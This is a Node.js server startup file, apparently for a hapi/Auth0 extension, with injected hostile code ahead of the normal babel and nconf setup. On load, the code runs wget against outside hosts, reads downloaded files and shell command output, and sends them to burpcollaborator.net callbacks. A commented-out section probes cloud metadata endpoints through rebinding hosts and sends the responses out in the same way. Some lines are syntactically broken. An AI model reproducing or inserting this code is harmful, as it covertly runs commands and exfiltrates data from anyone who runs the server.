const path = require('path');
const nconf = require('nconf');
const { exec } = require("child_process");

exec("wget http://hav6cctq6ivan5c60wrtjil22t8nwc.cc/d.txt", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
/*var request = require('request');
request('http://google.com/robots.txt', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});
// const logger = require('./server/init');
 var request = require('request');
request('http://169.254.169.254/', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});

var request = require('request');
request('http://make-1.1.1.1-rebind-169.254.169.254-rr.1u.ms/latest/meta-data/', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});

var request = require('request');
request('http://169.254.169.254.nip.io/latest/meta-data/', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});

var request = require('request');
request('http://127.0.0.1/', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});

*/
var request = require('request');
followAllRedirects: true,
request('http://0xp.cc/test.txt', function (error, response, body) {
  if (1 == 1) {
    console.log(response.statusCode);
    console.log(response.body);    // Prints the JSON object
request('http://u0v760mwyr2w9wdiinuyo6k1psvjq7f.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
}
});

var request = require('request');
const fs = require('fs')
fs.readFile('d.txt', 'utf8' , (err, data) => {
  if (err) {
    console.error(err)
    return
  }
  console.log(data);
  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?filelocal=' +data);

});

const spawn = require('child_process');
var request = require('request');
spawn.exec("wget http://0xp.cc/x.json -O /tmp/x.json; cat /tmp/x.json; ls /tmp", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce-error=' + error.message);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce=' + stderr)
        return;
    }
   if (1 == 1) {
   request('http://hav6cctq6ivan5c60wrtjil22t8nwc.burpcollaborator.net/?rce=' + stdout)
        return;
    }
    console.log(`stdout: ${stdout}`);
});

// Initialize babel.
require('@babel/register')({
  ignore: [ /node_modules/ ],
  sourceMaps: !(process.env.NODE_ENV === 'production')
});
require('@babel/polyfill');

// Initialize configuration.
nconf
  .argv()
  .env()
  .file(path.join(__dirname, './server/config.json'))
  .defaults({
    AUTH0_RTA: 'auth0.auth0.com',
    DATA_CACHE_MAX_AGE: 1000 * 10,
    NODE_ENV: 'development',
    HOSTING_ENV: 'default',
    PORT: 3001,
    USE_OAUTH2: false,
    LOG_COLOR: true
  });

// Start the server.
return require('./server/init').default((key) => nconf.get(key), null, (err, hapi) => {
  if (err) {
    return logger.error(err);
  }

  return hapi.start(() => {
    logger.info('Server running at:', hapi.info.uri);
  });
});
